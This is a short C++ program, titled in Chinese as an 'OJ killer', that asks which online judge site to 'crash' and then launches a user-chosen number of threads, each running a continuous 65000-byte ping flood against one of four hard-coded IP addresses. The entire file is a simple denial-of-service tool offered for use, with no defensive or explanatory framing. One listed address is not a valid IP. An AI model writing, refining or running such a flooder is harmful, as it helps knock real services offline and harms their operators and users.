#include<cstdio>
#include<iostream>
#include<thread>
#include<chrono>
#include<bits/stdc++.h>
using namespace std;
string str[4] = {"ping 122.14.299.127 -t -l 65000 -w 10","ping 123.60.188.246 -t -l 65000 -w 10","ping 47.93.79.227 -t -l 65000 -w 10","ping 43.143.93.40 -t -l 65000 -w 10"};
//string c[200] = "";
int x;
void threadf(){
	system(str[x].c_str());
} 
int main(){
	//freopen("","r",stdin);
	//freopen("","w",stdout);
	printf("你要崩掉那个oj\n1 123oj 2 47oj 3 43oj\n");
	cin>>x;
	int n = 0;
	cin>>n;
	thread g[n];
	for(int i = 0;i<n;i++){
		g[i] = thread(threadf);
	}
	int i = 0;
	while(1>0){
		this_thread::sleep_for(chrono::seconds(1));
		//string s1 = "title 'sec:";
		//string s2 = 
		i++;
		if(i%10==0){
			system("cls");
			printf("#####sec:%d#####\n",i);
		}
		if(i%10==2){
			system("title 按下ctrl+C多次即可退出");
		}
		if(i%10==7){
			system("title 欢迎使用oj杀手");
		}
	}
	for(int i = 0;i<n;i++){
		g[i].join();
	}
	return 0;
}

